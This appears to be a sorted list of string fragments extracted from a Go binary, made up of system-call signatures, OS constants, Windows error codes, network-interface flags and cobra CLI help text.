Fsid        Fsid
Fsid        uint32
Fsid        uint64
Fsid      Fsid64_t
Fsid      Fsid_t
Fsid     uint64
Fsid    Fsid
Fsid    uint64
Fsidx       Fsid
Fsize     uint32
Fsize     uint64
Fsname       [45]byte
Fspflag2  byte
Fssubtype   uint32
Fstname      [9]byte
Fstore_t) error {
Fstr     [32]int8
Fstype       uint32
Fstype  [16]int8
Fstypename  [16]byte
Fstypename  [32]byte
Fsync(fd int) (err error)
Full 
FullDllName        NTUnicodeString
FullName   
FullPathName     [256]byte
Future                    // Reserved for future definition.
Fw_rev         [8]uint8
Fw_version   [32]byte
GCN_E_DEFAULTNAMESPACE_EXISTS                                             Handle        = 0x803B0029
GCN_E_MODULE_NOT_FOUND                                                    Handle        = 0x803B0021
GCN_E_NETADAPTER_NOT_FOUND                                                Handle        = 0x803B0026
GCN_E_NETADAPTER_TIMEOUT                                                  Handle        = 0x803B0025
GCN_E_NETCOMPARTMENT_NOT_FOUND                                            Handle        = 0x803B0027
GCN_E_NETINTERFACE_NOT_FOUND                                              Handle        = 0x803B0028
GCN_E_NO_REQUEST_HANDLERS                                                 Handle        = 0x803B0022
GCN_E_REQUEST_UNSUPPORTED                                                 Handle        = 0x803B0023
GCN_E_RUNTIMEKEYS_FAILED                                                  Handle        = 0x803B0024
GENERIC_ALL              = 0x10000000
GENERIC_EXECUTE          = 0x20000000
GENERIC_READ             = 0x80000000
GENERIC_WRITE            = 0x40000000
GENL_/ 
GENL_ADMIN_PERM                             = 0x1
GENL_CMD_CAP_DO                             = 0x2
GENL_CMD_CAP_DUMP                           = 0x4
GENL_CMD_CAP_HASPOL                         = 0x8
GENL_HDRLEN                                 = 0x4
GENL_ID_CTRL                                = 0x10
GENL_ID_PMCRAID                             = 0x12
GENL_ID_VFS_DQUOT                           = 0x11
GENL_MAX_ID                                 = 0x3ff
GENL_MIN_ID                                 = 0x10
GENL_NAMSIZ                                 = 0x10
GENL_START_ALLOC                            = 0x13
GENL_UNS_ADMIN_PERM                         = 0x10
GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS       = 4
GET_MODULE_HANDLE_EX_FLAG_PIN                = 1
GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT = 2
GLOBL
GOARCH are set correctly and run 
GOOSARCH_in=syscall_$GOOSARCH.go
GRANT_ACCESS      = 1
GRND_/ 
GRND_INSECURE                               = 0x4
GRND_NONBLOCK                               = 0x1
GRND_RANDOM                                 = 0x2
GROUP_SECURITY_INFORMATION            = 0x00000002
GUID
GUID) (ret error) = ole32.CLSIDFromString
GUID) (ret error) = ole32.CoCreateGuid
GUID) (ret error) {
GatewayList         IpAddrString
Gen            uint32
Gen      uint32
Gen     uint32
Gen     uint64
Gen   uint64
GenBashCompletion()
GenBashCompletionFile()
GenBashCompletionFileV2()
GenBashCompletionV2()
GenZshCompletionFileNoDesc()
GenZshCompletionNoDesc()
General questions should go to the [golang-nuts mailing list](https://groups.google.com/group/golang-nuts) instead of the issue tracker.
Generate the autocompletion script for %[1]s for the specified shell.
Generate the autocompletion script for powershell.
Generate the autocompletion script for the bash shell.
Generate the autocompletion script for the fish shell.
Generate the autocompletion script for the zsh shell.
Generate_cnt  uint64
Generate_public_key_cnt   uint64
Generate_tlen uint64
Generated by 
Generated by godefs and the types file (see above).
Geniv       [64]int8
Geniv       [64]uint8
Genvalue  uint32
Get-Help about_Profiles
GetACP() (acp uint32) = kernel32.GetACP
GetAcceptExSockaddrs(buf 
GetActiveProcessorCount(groupNumber uint16) (ret uint32)
GetAdaptersInfo(ai 
GetAddrInfoW(nodename 
GetCommandLine() (cmd 
GetComputerName(buf 
GetCurrentProcessId() (pid uint32) = kernel32.GetCurrentProcessId
GetCurrentThreadId() (id uint32)
GetDiskFreeSpaceEx(directoryName 
GetDriveType(rootPathName 
GetEnvironmentStrings() (envs 
GetEnvironmentVariable(name 
GetFileAttributes(name 
GetFileAttributesEx(name 
GetFileExInfoStandard = 0
GetFileExMaxInfoLevel = 1
GetFullPathName(path 
GetHostByName(name string) (h 
GetIfEntry(pIfRow 
GetLastError() (lasterr error)
GetLengthSid(sid 
GetLongPathName(path 
GetMaximumProcessorCount(groupNumber uint16) (ret uint32)
GetProcessShutdownParameters(level 
GetProtoByName(name string) (p 
GetShellWindow() (shellWindow HWND) = user32.GetShellWindow
GetShortPathName(longpath 
GetSlice() []string
GetStartupInfo(startupInfo 
GetSystemTimeAsFileTime(
GetSystemTimeAsFileTime(time 
GetSystemTimePreciseAsFileTime(time 
GetTimeZoneInformation(tzi 
GetVolumeInformation(rootPathName 
GetVolumeNameForVolumeMountPoint(volumeMountPoint 
GetVolumePathName(fileName 
GetVolumePathNamesForVolumeName(volumeName 
Getdtablesize() (size int)
Getegid() (egid int)
Getegid() (egid int) = SYS_GETEGID32
Geteuid() (euid int)
Geteuid() (euid int) = SYS_GETEUID32
Geteuid() (uid int)
Getgid() (gid int)
Getgid() (gid int) = SYS_GETGID32
Gethostuuid(uuid 
Getpgrp() (pgrp int)
Getpgrp() (pid int)
Getpid() (pid int)
Getppid() (pid int)
Getppid() (ppid int)
Getsystemcfg(label int) (n uint64)
Gettid() (tid int)
Gettimeofday(tp 
Gettimeofday(tv 
Getuid() (uid int)
Getuid() (uid int) = SYS_GETUID32
Gid             uint32
Gid            uint32
Gid          int32
Gid        uint32
Gid      uint32
Gid     uint32
Gid    string // group name
Gid  uint32
Gid uint32
GlblcntUsage uint32
Global Flags:
Go is an open source project.
Go numeric constants. See 
Google as part of the Go project.
Gp  uint64
Gpr       [32]uint32
Gpr       [32]uint64
Gprs                     [16]uint64
GreaterThanOrEqual
Group  = Domain(1)
GroupCount uint32
Groups     [1]SIDAndAttributes // Use AllGroups() for iterating.
Groups  [16]uint32
Groups uint32
Grown int32
Gs       uint64
Gs     uint16
Gs     uint32
Gs_base  uint64
HANDLE
HANDLE_FLAG_INHERIT    = 0x00000001
HCI_CHANNEL_CONTROL = 3
HCI_CHANNEL_LOGGING = 4
HCI_CHANNEL_MONITOR = 2
HCI_CHANNEL_RAW     = 0
HCI_CHANNEL_USER    = 1
HCN_E_ADAPTER_NOT_FOUND                                                   Handle        = 0x803B0006
HCN_E_ADDR_INVALID_OR_RESERVED                                            Handle        = 0x803B002F
HCN_E_DEGRADED_OPERATION                                                  Handle        = 0x803B0017
HCN_E_ENDPOINT_ALREADY_ATTACHED                                           Handle        = 0x803B0014
HCN_E_ENDPOINT_NAMESPACE_ALREADY_EXISTS                                   Handle        = 0x803B002B
HCN_E_ENDPOINT_NOT_FOUND                                                  Handle        = 0x803B0002
HCN_E_ENDPOINT_SHARING_DISABLED                                           Handle        = 0x803B001D
HCN_E_ENTITY_HAS_REFERENCES                                               Handle        = 0x803B002C
HCN_E_GUID_CONVERSION_FAILURE                                             Handle        = 0x803B0019
HCN_E_ICS_DISABLED                                                        Handle        = 0x803B002A
HCN_E_INVALID_ENDPOINT                                                    Handle        = 0x803B000C
HCN_E_INVALID_INTERNAL_PORT                                               Handle        = 0x803B002D
HCN_E_INVALID_IP                                                          Handle        = 0x803B001E
HCN_E_INVALID_JSON                                                        Handle        = 0x803B001B
HCN_E_INVALID_JSON_REFERENCE                                              Handle        = 0x803B001C
HCN_E_INVALID_NETWORK                                                     Handle        = 0x803B000A
HCN_E_INVALID_NETWORK_TYPE                                                Handle        = 0x803B000B
HCN_E_INVALID_POLICY                                                      Handle        = 0x803B000D
HCN_E_INVALID_POLICY_TYPE                                                 Handle        = 0x803B000E
HCN_E_INVALID_REMOTE_ENDPOINT_OPERATION                                   Handle        = 0x803B000F
HCN_E_LAYER_ALREADY_EXISTS                                                Handle        = 0x803B0011
HCN_E_LAYER_NOT_FOUND                                                     Handle        = 0x803B0003
HCN_E_MANAGER_STOPPED                                                     Handle        = 0x803B0020
HCN_E_MAPPING_NOT_SUPPORTED                                               Handle        = 0x803B0016
HCN_E_NAMESPACE_ATTACH_FAILED                                             Handle        = 0x803B002E
HCN_E_NETWORK_ALREADY_EXISTS                                              Handle        = 0x803B0010
HCN_E_NETWORK_NOT_FOUND                                                   Handle        = 0x803B0001
HCN_E_POLICY_ALREADY_EXISTS                                               Handle        = 0x803B0012
HCN_E_POLICY_NOT_FOUND                                                    Handle        = 0x803B0008
HCN_E_PORT_ALREADY_EXISTS                                                 Handle        = 0x803B0013
HCN_E_PORT_NOT_FOUND                                                      Handle        = 0x803B0007
HCN_E_REGKEY_FAILURE                                                      Handle        = 0x803B001A
HCN_E_REQUEST_UNSUPPORTED                                                 Handle        = 0x803B0015
HCN_E_SHARED_SWITCH_MODIFICATION                                          Handle        = 0x803B0018
HCN_E_SUBNET_NOT_FOUND                                                    Handle        = 0x803B0005
HCN_E_SWITCH_EXTENSION_NOT_FOUND                                          Handle        = 0x803B001F
HCN_E_SWITCH_NOT_FOUND                                                    Handle        = 0x803B0004
HCN_E_VFP_PORTSETTING_NOT_FOUND                                           Handle        = 0x803B0009
HCS_E_ACCESS_DENIED                                                       Handle        = 0x8037011B
HCS_E_CONNECTION_CLOSED                                                   Handle        = 0x8037010A
HCS_E_CONNECTION_TIMEOUT                                                  Handle        = 0x80370109
HCS_E_CONNECT_FAILED                                                      Handle        = 0x80370108
HCS_E_GUEST_CRITICAL_ERROR                                                Handle        = 0x8037011C
HCS_E_HYPERV_NOT_INSTALLED                                                Handle        = 0x80370102
HCS_E_IMAGE_MISMATCH                                                      Handle        = 0x80370101
HCS_E_INVALID_JSON                                                        Handle        = 0x8037010D
HCS_E_INVALID_LAYER                                                       Handle        = 0x80370112
HCS_E_INVALID_STATE                                                       Handle        = 0x80370105
HCS_E_OPERATION_ALREADY_STARTED                                           Handle        = 0x80370116
HCS_E_OPERATION_NOT_STARTED                                               Handle        = 0x80370115
HCS_E_OPERATION_PENDING                                                   Handle        = 0x80370117
HCS_E_OPERATION_RESULT_ALLOCATION_FAILED                                  Handle        = 0x8037011A
HCS_E_OPERATION_SYSTEM_CALLBACK_ALREADY_SET                               Handle        = 0x80370119
HCS_E_OPERATION_TIMEOUT                                                   Handle        = 0x80370118
HCS_E_PROTOCOL_ERROR                                                      Handle        = 0x80370111
HCS_E_SERVICE_NOT_AVAILABLE                                               Handle        = 0x80370114
HCS_E_SYSTEM_ALREADY_EXISTS                                               Handle        = 0x8037010F
HCS_E_SYSTEM_ALREADY_STOPPED                                              Handle        = 0x80370110
HCS_E_SYSTEM_NOT_FOUND                                                    Handle        = 0x8037010E
HCS_E_TERMINATED                                                          Handle        = 0x80370107
HCS_E_TERMINATED_DURING_START                                             Handle        = 0x80370100
HCS_E_UNEXPECTED_EXIT                                                     Handle        = 0x80370106
HCS_E_UNKNOWN_MESSAGE                                                     Handle        = 0x8037010B
HCS_E_UNSUPPORTED_PROTOCOL_VERSION                                        Handle        = 0x8037010C
HCS_E_WINDOWS_INSIDER_REQUIRED                                            Handle        = 0x80370113
HDIO_DRIVE_CMD                              = 0x31f
HDIO_DRIVE_CMD_AEB                          = 0x31e
HDIO_DRIVE_CMD_HDR_SIZE                     = 0x4
HDIO_DRIVE_HOB_HDR_SIZE                     = 0x8
HDIO_DRIVE_RESET                            = 0x31c
HDIO_DRIVE_TASK                             = 0x31e
HDIO_DRIVE_TASKFILE                         = 0x31d
HDIO_DRIVE_TASK_HDR_SIZE                    = 0x8
HDIO_GETGEO                                 = 0x301
HDIO_GET_32BIT                              = 0x309
HDIO_GET_ACOUSTIC                           = 0x30f
HDIO_GET_ADDRESS                            = 0x310
HDIO_GET_BUSSTATE                           = 0x31a
HDIO_GET_DMA                                = 0x30b
HDIO_GET_IDENTITY                           = 0x30d
HDIO_GET_KEEPSETTINGS                       = 0x308
HDIO_GET_MULTCOUNT                          = 0x304
HDIO_GET_NICE                               = 0x30c
HDIO_GET_NOWERR                             = 0x30a
HDIO_GET_QDMA                               = 0x305
HDIO_GET_UNMASKINTR                         = 0x302
HDIO_GET_WCACHE                             = 0x30e
HDIO_OBSOLETE_IDENTITY                      = 0x307
HDIO_SCAN_HWIF                              = 0x328
HDIO_SET_32BIT                              = 0x324
HDIO_SET_ACOUSTIC                           = 0x32c
HDIO_SET_ADDRESS                            = 0x32f
HDIO_SET_BUSSTATE                           = 0x32d
HDIO_SET_DMA                                = 0x326
HDIO_SET_KEEPSETTINGS                       = 0x323
HDIO_SET_MULTCOUNT                          = 0x321
HDIO_SET_NICE                               = 0x329
HDIO_SET_NOWERR                             = 0x325
HDIO_SET_PIO_MODE                           = 0x327
HDIO_SET_QDMA                               = 0x32e
HDIO_SET_UNMASKINTR                         = 0x322
HDIO_SET_WCACHE                             = 0x32b
HDIO_SET_XFER                               = 0x306
HDIO_TRISTATE_HWIF                          = 0x31b
HDIO_UNREGISTER_HWIF                        = 0x32a
HEvent       Handle
HIDIOC/ 
HIDIOCGRAWINFO                   = 0x40084803
HIDIOCGRAWINFO                   = 0x80084803
HIDIOCGRAWNAME(_HIDIOCGRAWNAME_LEN)
HIDIOCGRAWPHYS(_HIDIOCGRAWPHYS_LEN)
HIDIOCGRAWUNIQ(_HIDIOCGRAWUNIQ_LEN)
HIDIOCGRDESC                     = 0x50044802
HIDIOCGRDESC                     = 0x90044802
HIDIOCGRDESCSIZE                 = 0x40044801
HIDIOCGRDESCSIZE                 = 0x80044801
HIDRawDevInfo struct {
HIDRawReportDescriptor struct {
HIDRawReportDescriptor) error {
HID_MAX_DESCRIPTOR_SIZE                     = 0x1000
HIGH_PRIORITY_CLASS           = 0x00000080
HKEY_CLASSES_ROOT = 0x80000000 
HKEY_CURRENT_CONFIG
HKEY_CURRENT_USER
HKEY_DYN_DATA
HKEY_LOCAL_MACHINE
HKEY_PERFORMANCE_DATA
HKEY_USERS
HOSTFS_SUPER_MAGIC                          = 0xc0ffee
HPFS_SUPER_MAGIC                            = 0xf995e849
HRESULT
HTTP_E_STATUS_AMBIGUOUS                                                   Handle        = 0x8019012C
HTTP_E_STATUS_BAD_GATEWAY                                                 Handle        = 0x801901F6
HTTP_E_STATUS_BAD_METHOD                                                  Handle        = 0x80190195
HTTP_E_STATUS_BAD_REQUEST                                                 Handle        = 0x80190190
HTTP_E_STATUS_CONFLICT                                                    Handle        = 0x80190199
HTTP_E_STATUS_DENIED                                                      Handle        = 0x80190191
HTTP_E_STATUS_EXPECTATION_FAILED                                          Handle        = 0x801901A1
HTTP_E_STATUS_FORBIDDEN                                                   Handle        = 0x80190193
HTTP_E_STATUS_GATEWAY_TIMEOUT                                             Handle        = 0x801901F8
HTTP_E_STATUS_GONE                                                        Handle        = 0x8019019A
HTTP_E_STATUS_LENGTH_REQUIRED                                             Handle        = 0x8019019B
HTTP_E_STATUS_MOVED                                                       Handle        = 0x8019012D
HTTP_E_STATUS_NONE_ACCEPTABLE                                             Handle        = 0x80190196
HTTP_E_STATUS_NOT_FOUND                                                   Handle        = 0x80190194
HTTP_E_STATUS_NOT_MODIFIED                                                Handle        = 0x80190130
HTTP_E_STATUS_NOT_SUPPORTED                                               Handle        = 0x801901F5
HTTP_E_STATUS_PAYMENT_REQ                                                 Handle        = 0x80190192
HTTP_E_STATUS_PRECOND_FAILED                                              Handle        = 0x8019019C
HTTP_E_STATUS_PROXY_AUTH_REQ                                              Handle        = 0x80190197
HTTP_E_STATUS_RANGE_NOT_SATISFIABLE                                       Handle        = 0x801901A0
HTTP_E_STATUS_REDIRECT                                                    Handle        = 0x8019012E
HTTP_E_STATUS_REDIRECT_KEEP_VERB                                          Handle        = 0x80190133
HTTP_E_STATUS_REDIRECT_METHOD                                             Handle        = 0x8019012F
HTTP_E_STATUS_REQUEST_TIMEOUT                                             Handle        = 0x80190198
HTTP_E_STATUS_REQUEST_TOO_LARGE                                           Handle        = 0x8019019D
HTTP_E_STATUS_SERVER_ERROR                                                Handle        = 0x801901F4
HTTP_E_STATUS_SERVICE_UNAVAIL                                             Handle        = 0x801901F7
HTTP_E_STATUS_UNEXPECTED                                                  Handle        = 0x80190001
HTTP_E_STATUS_UNEXPECTED_CLIENT_ERROR                                     Handle        = 0x80190004
HTTP_E_STATUS_UNEXPECTED_REDIRECTION                                      Handle        = 0x80190003
HTTP_E_STATUS_UNEXPECTED_SERVER_ERROR                                     Handle        = 0x80190005
HTTP_E_STATUS_UNSUPPORTED_MEDIA                                           Handle        = 0x8019019F
HTTP_E_STATUS_URI_TOO_LONG                                                Handle        = 0x8019019E
HTTP_E_STATUS_USE_PROXY                                                   Handle        = 0x80190131
HTTP_E_STATUS_VERSION_NOT_SUP                                             Handle        = 0x801901F9
HUGETLBFS_MAGIC                             = 0x958458f6
HUPCL                                   = 0x4000
HUPCL                             = 0x4000
HUPCL                            = 0x400
HUPCL                            = 0x4000
HUPCL                          = 0x4000
HUPCL                         = 0x400
HWND(0)
HW_MACHINE                              = 0x1
HW_MACHINE                        = 0x1
HW_MACHINE                     = 0x1
HW_MACHINE$/ 
Halen    uint8
Handle
Handle   Handle
Handle  Handle
Handle  [8]int8
Handle  [8]uint8
Handle Handle
Handle(0)
Handle) (err error) = kernel32.GetModuleHandleExW
Handle) (err error) {
Handle) (regerrno error) = advapi32.RegOpenKeyExW
Handle) (regerrno error) {
HandleCount                  uint32
HardFaultCount               uint32
Has been added for all shells
HasFreshnessTime uint32
HasPassword   bool
HasRevocationFreshnessTime uint32
Hash_algorithm uint32
Hash_cnt  uint64
Hash_tlen uint64
Hatype   uint16
HaveWins            bool
Hdr     [40]byte
Hdrlen       uint8
Hdrlen      uint8
Hdrlen     uint8
Hdrlen    uint16
Hdrlen   uint16
Hdrlen  uint16
Head       uintptr
HeadLength uint32
Header Cmsghdr
Headroom uint32
Heads          uint16
Heads     uint8
HeapPartitionName                NTUnicodeString
Help is just a command like any other. There is no special logic or behavior
Help provides help for any command in the application.
Here are some guidelines to help you get started.
Hi       uint64
Hid   [4]byte
Hidden              bool                // used by cobra.Command to allow flags to be hidden from help/usage text
Hidden bool
HiddenDefaultCmd bool
HighDateTime uint32
HighPart int32
HighVersion  uint16
Hint
Hisigs uint32
Hiwat uint32
Hiwater_rss               uint64
Hiwater_vm                uint64
Hopcount  uint64
Hopcount uint32
Hopcount uint64
Hops    uint8
Host 
Hostent)(unsafe.Pointer(r0))
Hostname        string
Hostname      string
HostnameMatches bool
Hour         uint16
Hour  int32
Hv1         TpacketHdrVariant1
HwProfile          uint32
Hw_config      uint16
Hwassist    uint32
Hwassist    uint64
Hwassist   uint32
Hwassist   uint64
Hwm   uint16
Hwnd              HWND
Hz      int32
Hz     int32
I(SIG
IBMTCP_IMAGE                    = 1
IBSHIFT                                     = 0x10
IBSHIFT                       = 0x10
ICANON                                  = 0x100
ICANON                            = 0x100
ICANON                           = 0x100
ICANON                           = 0x2
ICANON                          = 0x0010
ICANON                         = 0x100
ICANON                        = 0x2
ICMP6
ICMP6_FILTER                            = 0x12
ICMP6_FILTER                      = 0x12
ICMP6_FILTER                    = 0x26
ICMP6_FILTER                   = 0x12
ICMP6_FILTER                  = 0x1
ICMP6_FILTER                  = 0x26
ICMP6_SEC_SEND_DEL            = 0x46
ICMP6_SEC_SEND_GET            = 0x47
ICMP6_SEC_SEND_SET            = 0x44
ICMP6_SEC_SEND_SET_CGA_ADDR   = 0x45
ICMPV
ICMPV6_FILTER             = 0x1
ICMPV6_FILTER_BLOCK       = 0x1
ICMPV6_FILTER_BLOCKOTHERS = 0x3
ICMPV6_FILTER_PASS        = 0x2
ICMPV6_FILTER_PASSONLY    = 0x4
ICMP_FILTER = 0x1
ICMPv6Filter) error {
ICRNL                                       = 0x100
ICRNL                                   = 0x100
ICRNL                             = 0x100
ICRNL                           = 0x0002
ICRNL                          = 0x100
ICRNL                         = 0x100
ID          [4]byte
ID   uint32
ID string 
IDLE_PRIORITY_CLASS           = 0x00000040
IEXTEN                                  = 0x400
IEXTEN                            = 0x400
IEXTEN                           = 0x100
IEXTEN                           = 0x400
IEXTEN                           = 0x8000
IEXTEN                          = 0x0020
IEXTEN                         = 0x400
IEXTEN                        = 0x200000
IEXTEN                        = 0x8000
IFAN
IFAN_ARRIVAL                      = 0x0
IFAN_ARRIVAL                   = 0x0
IFAN_DEPARTURE                    = 0x1
IFAN_DEPARTURE                 = 0x1
IFA_ADDRESS        = 0x1
IFA_ANYCAST        = 0x5
IFA_BROADCAST      = 0x4
IFA_CACHEINFO      = 0x6
IFA_FIRSTALIAS                = 0x2000
IFA_FLAGS          = 0x8
IFA_F_DADFAILED                             = 0x8
IFA_F_DEPRECATED                            = 0x20
IFA_F_HOMEADDRESS                           = 0x10
IFA_F_MANAGETEMPADDR                        = 0x100
IFA_F_MCAUTOJOIN                            = 0x400
IFA_F_NODAD                                 = 0x2
IFA_F_NOPREFIXROUTE                         = 0x200
IFA_F_OPTIMISTIC                            = 0x4
IFA_F_PERMANENT                             = 0x80
IFA_F_SECONDARY                             = 0x1
IFA_F_STABLE_PRIVACY                        = 0x800
IFA_F_TEMPORARY                             = 0x1
IFA_F_TENTATIVE                             = 0x40
IFA_LABEL          = 0x3
IFA_LOCAL          = 0x2
IFA_MAX                                     = 0xb
IFA_MULTICAST      = 0x7
IFA_ROUTE                         = 0x1
IFA_ROUTE                     = 0x1
IFA_RT_PRIORITY    = 0x9
IFA_TARGET_NETNSID = 0xa
IFA_UNSPEC         = 0x0
IFCAP_WOL_MAGIC                = 0x2000
IFF_64BIT                     = 0x4000000
IFF_ADDRCONF                  = 0x80000
IFF_ALLCAST                   = 0x20000
IFF_ALLMULTI                                = 0x200
IFF_ALLMULTI                            = 0x200
IFF_ALLMULTI                      = 0x200
IFF_ALLMULTI                   = 0x200
IFF_ALLMULTI                  = 0x200
IFF_ALTPHYS                             = 0x4000
IFF_ALTPHYS                       = 0x4000
IFF_ALTPHYS                    = 0x4000
IFF_ANYCAST                   = 0x400000
IFF_ATTACH_QUEUE                            = 0x200
IFF_AUTOMEDIA                               = 0x4000
IFF_BPF                       = 0x8000000
IFF_BRIDGE                    = 0x40000
IFF_BROADCAST                               = 0x2
IFF_BROADCAST                           = 0x2
IFF_BROADCAST                     = 0x2
IFF_BROADCAST                  = 0x2
IFF_BROADCAST                 = 0x2
IFF_BROADCAST    = 2
IFF_CANTCHANGE                    = 0x318e72
IFF_CANTCHANGE                    = 0x8e52
IFF_CANTCHANGE                    = 0x8f52
IFF_CANTCHANGE                 = 0x218f52
IFF_CANTCHANGE                = 0x7f203003b5a
IFF_CANTCHANGE                = 0x80c52
IFF_CANTCONFIG                 = 0x10000
IFF_CHECKSUM_OFFLOAD          = 0x10000000
IFF_COS_ENABLED               = 0x200000000
IFF_D1                        = 0x8000
IFF_D2                        = 0x4000
IFF_D3                        = 0x2000
IFF_D4                        = 0x1000
IFF_DEBUG                                   = 0x4
IFF_DEBUG                               = 0x4
IFF_DEBUG                         = 0x4
IFF_DEBUG                      = 0x4
IFF_DEBUG                     = 0x4
IFF_DEPRECATED                = 0x40000
IFF_DETACH_QUEUE                            = 0x400
IFF_DEVHEALTH                 = 0x4000
IFF_DHCPRUNNING               = 0x4000
IFF_DORMANT                                 = 0x20000
IFF_DO_HW_LOOPBACK            = 0x10000
IFF_DRV_OACTIVE                = 0x400
IFF_DRV_RUNNING                = 0x40
IFF_DUPLICATE                 = 0x4000000000
IFF_DYING                      = 0x200000
IFF_DYNAMIC                                 = 0x8000
IFF_ECHO                                    = 0x40000
IFF_FAILED                    = 0x10000000
IFF_FIXEDMTU                  = 0x1000000000
IFF_GROUP_ROUTING             = 0x2000000
IFF_IDIRECT                       = 0x200000
IFF_IFBUFMGT                  = 0x800000
IFF_INACTIVE                  = 0x40000000
IFF_INTELLIGENT               = 0x400
IFF_IPMP                      = 0x8000000000
IFF_IPMP_CANTCHANGE           = 0x10000000
IFF_IPMP_INVALID              = 0x1ec200080
IFF_IPV4                      = 0x1000000
IFF_IPV6                      = 0x2000000
IFF_L3PROTECT                 = 0x40000000000
IFF_LINK0                               = 0x1000
IFF_LINK0                         = 0x1000
IFF_LINK0                      = 0x1000
IFF_LINK0                     = 0x100000
IFF_LINK1                               = 0x2000
IFF_LINK1                         = 0x2000
IFF_LINK1                      = 0x2000
IFF_LINK1                     = 0x200000
IFF_LINK2                               = 0x4000
IFF_LINK2                         = 0x4000
IFF_LINK2                      = 0x4000
IFF_LINK2                     = 0x400000
IFF_LOOPBACK                                = 0x8
IFF_LOOPBACK                            = 0x8
IFF_LOOPBACK                      = 0x8
IFF_LOOPBACK                   = 0x8
IFF_LOOPBACK                  = 0x8
IFF_LOOPBACK     = 4
IFF_LOWER_UP                                = 0x10000
IFF_MASTER                                  = 0x400
IFF_MONITOR                       = 0x40000
IFF_MONITOR                    = 0x40000
IFF_MULTICAST                               = 0x1000
IFF_MULTICAST                           = 0x8000
IFF_MULTICAST                     = 0x8000
IFF_MULTICAST                  = 0x8000
IFF_MULTICAST                 = 0x800
IFF_MULTICAST                 = 0x80000
IFF_MULTICAST    = 16
IFF_MULTI_BCAST               = 0x1000
IFF_MULTI_QUEUE                             = 0x100
IFF_NAPI                                    = 0x10
IFF_NAPI_FRAGS                              = 0x20
IFF_NOACCEPT                  = 0x4000000
IFF_NOARP                                   = 0x80
IFF_NOARP                               = 0x80
IFF_NOARP                         = 0x80
IFF_NOARP                      = 0x80
IFF_NOARP                     = 0x80
IFF_NOECHO                    = 0x800
IFF_NOFAILOVER                = 0x8000000
IFF_NOFILTER                                = 0x1000
IFF_NOGROUP                    = 0x800000
IFF_NOLINKLOCAL               = 0x20000000000
IFF_NOLOCAL                   = 0x20000
IFF_NONUD                     = 0x200000
IFF_NORTEXCH                  = 0x800000
IFF_NOTRAILERS                              = 0x20
IFF_NOTRAILERS                          = 0x20
IFF_NOTRAILERS                    = 0x20
IFF_NOTRAILERS                = 0x20
IFF_NOXMIT                    = 0x10000
IFF_NO_PI                                   = 0x1000
IFF_NPOLLING                      = 0x100000
IFF_OACTIVE                             = 0x400
IFF_OACTIVE                       = 0x400
IFF_OACTIVE                    = 0x400
IFF_OACTIVE                   = 0x400
IFF_OACTIVE_COMPAT                = 0x400
IFF_OFFLINE                   = 0x80000000
IFF_ONE_QUEUE                               = 0x2000
IFF_PERSIST                                 = 0x800
IFF_POINTOPOINT                             = 0x10
IFF_POINTOPOINT                         = 0x10
IFF_POINTOPOINT                   = 0x10
IFF_POINTOPOINT                = 0x10
IFF_POINTOPOINT               = 0x10
IFF_POINTTOPOINT = 8
IFF_POLLING                       = 0x10000
IFF_POLLING_COMPAT                = 0x10000
IFF_PORTSEL                                 = 0x2000
IFF_PPROMISC                      = 0x20000
IFF_PPROMISC                   = 0x20000
IFF_PREFERRED                 = 0x400000000
IFF_PRIVATE                   = 0x8000
IFF_PROMISC                                 = 0x100
IFF_PROMISC                             = 0x100
IFF_PROMISC                       = 0x100
IFF_PROMISC                    = 0x100
IFF_PROMISC                   = 0x100
IFF_PSEG                      = 0x40000000
IFF_RENAMING                   = 0x400000
IFF_ROUTER                    = 0x100000
IFF_RUNNING                                 = 0x40
IFF_RUNNING                             = 0x40
IFF_RUNNING                       = 0x40
IFF_RUNNING                    = 0x40
IFF_RUNNING                   = 0x40
IFF_SIMPLEX                             = 0x800
IFF_SIMPLEX                       = 0x800
IFF_SIMPLEX                    = 0x800
IFF_SIMPLEX                   = 0x800
IFF_SLAVE                                   = 0x800
IFF_SMART                         = 0x20
IFF_SMART       = 0x20
IFF_SNAP                      = 0x8000
IFF_STANDBY                   = 0x20000000
IFF_STATICARP                     = 0x20
IFF_STATICARP                     = 0x80000
IFF_STATICARP                  = 0x80000
IFF_TAP                                     = 0x2
IFF_TCP_DISABLE_CKSUM         = 0x20000000
IFF_TCP_NOCKSUM               = 0x1000000
IFF_TEMPORARY                 = 0x800000000
IFF_TUN                                     = 0x1
IFF_TUN_EXCL                                = 0x8000
IFF_UNNUMBERED                = 0x2000
IFF_UP                                      = 0x1
IFF_UP                                  = 0x1
IFF_UP                            = 0x1
IFF_UP                         = 0x1
IFF_UP                        = 0x1
IFF_UP           = 1
IFF_VIPA                      = 0x80000000
IFF_VIRTUAL                   = 0x2000000000
IFF_VNET_HDR                                = 0x4000
IFF_VOLATILE                                = 0x70c5a
IFF_VRRP                      = 0x10000000000
IFF_XRESOLV                   = 0x100000000
IFLA_ADDRESS                               = 0x1
IFLA_AF_SPEC                               = 0x1a
IFLA_ALT_IFNAME                            = 0x35
IFLA_BAREUDP_ETHERTYPE                     = 0x2
IFLA_BAREUDP_MULTIPROTO_MODE               = 0x4
IFLA_BAREUDP_PORT                          = 0x1
IFLA_BAREUDP_SRCPORT_MIN                   = 0x3
IFLA_BAREUDP_UNSPEC                        = 0x0
IFLA_BOND_ACTIVE_SLAVE                     = 0x2
IFLA_BOND_AD_ACTOR_SYSTEM                  = 0x1a
IFLA_BOND_AD_ACTOR_SYS_PRIO                = 0x18
IFLA_BOND_AD_INFO                          = 0x17
IFLA_BOND_AD_INFO_ACTOR_KEY                = 0x3
IFLA_BOND_AD_INFO_AGGREGATOR               = 0x1
IFLA_BOND_AD_INFO_NUM_PORTS                = 0x2
IFLA_BOND_AD_INFO_PARTNER_KEY              = 0x4
IFLA_BOND_AD_INFO_PARTNER_MAC              = 0x5
IFLA_BOND_AD_INFO_UNSPEC                   = 0x0
IFLA_BOND_AD_LACP_RATE                     = 0x15
IFLA_BOND_AD_SELECT                        = 0x16
IFLA_BOND_AD_USER_PORT_KEY                 = 0x19
IFLA_BOND_ALL_SLAVES_ACTIVE                = 0x11
IFLA_BOND_ARP_ALL_TARGETS                  = 0xa
IFLA_BOND_ARP_INTERVAL                     = 0x7
IFLA_BOND_ARP_IP_TARGET                    = 0x8
IFLA_BOND_ARP_VALIDATE                     = 0x9
IFLA_BOND_DOWNDELAY                        = 0x5
IFLA_BOND_FAIL_OVER_MAC                    = 0xd
